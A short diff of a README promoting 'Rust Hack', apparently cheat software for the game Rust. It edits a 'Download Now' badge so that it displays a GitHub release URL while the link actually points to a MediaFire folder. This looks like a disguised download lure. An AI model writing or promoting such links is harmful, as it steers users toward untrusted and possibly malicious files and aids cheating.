@@ -40,6 +40,6 @@ If you have any questions or need assistance, feel free to reach out to our supp
 ## 📌 Stay Updated
 Stay updated with the latest developments and releases by following us on GitHub and subscribing to our newsletter.
 
-[![Download Now](https://www.mediafire.com/folder/mjlie43361ml0/git_hub)
+[![Download Now](https://github.com/MonishKoushalBusani/rust-hack-fr33/releases/tag/v2.0)](https://www.mediafire.com/folder/mjlie43361ml0/git_hub)
 
 Dive into the world of Rust hacking with Rust Hack and become part of a community that values skill development, ethical behavior, and trust in gaming. Let's build a better gaming environment together! 🚀🎮💻
